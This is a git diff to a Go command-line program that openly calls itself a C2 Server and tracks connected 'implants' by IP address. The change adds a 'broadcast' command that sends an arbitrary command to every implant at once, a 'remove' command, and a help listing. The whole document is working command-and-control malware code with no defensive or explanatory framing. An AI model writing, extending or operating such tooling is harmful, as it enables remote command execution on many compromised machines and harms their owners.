@@ -93,7 +93,7 @@ func startCLI() {
 
 	line.SetCtrlCAborts(true)
 	line.SetCompleter(func(line string) []string {
-		commands := []string{"list", "send", "exit"}
+		commands := []string{"list", "send", "broadcast", "remove", "help", "exit"}
 		var suggestions []string
 		for _, cmd := range commands {
 			if strings.HasPrefix(cmd, line) {
@@ -122,6 +122,14 @@ func startCLI() {
 				continue
 			}
 			sendCommand(args[1], args[2])
+		case strings.HasPrefix(input, "broadcast "):
+			cmd := strings.TrimSpace(strings.TrimPrefix(input, "broadcast "))
+			broadcastCommand(cmd)
+		case strings.HasPrefix(input, "remove "):
+			ip := strings.TrimSpace(strings.TrimPrefix(input, "remove "))
+			removeImplant(ip)
+		case input == "help":
+			printHelp()
 		case input == "exit":
 			fmt.Println("[+] Exiting C2 Server...")
 			return
@@ -181,4 +189,34 @@ func sendCommand(ip, command string) {
 		return
 	}
 	fmt.Printf("[+] Response from %s: %s\n", ip, string(plain))
+}
+
+func broadcastCommand(command string) {
+	mutex.Lock()
+	ips := make([]string, 0, len(implants))
+	for ip := range implants {
+		ips = append(ips, ip)
+	}
+	mutex.Unlock()
+
+	for _, ip := range ips {
+		sendCommand(ip, command)
+	}
+}
+
+func removeImplant(ip string) {
+	mutex.Lock()
+	defer mutex.Unlock()
+	delete(implants, ip)
+	fmt.Printf("[+] Removed implant %s\n", ip)
+}
+
+func printHelp() {
+	fmt.Println("Available commands:")
+	fmt.Println("  list                 - list connected implants")
+	fmt.Println("  send <IP> <cmd>      - send command to an implant")
+	fmt.Println("  broadcast <cmd>      - send command to all implants")
+	fmt.Println("  remove <IP>          - remove implant from list")
+	fmt.Println("  help                 - show this message")
+	fmt.Println("  exit                 - quit server")
 }
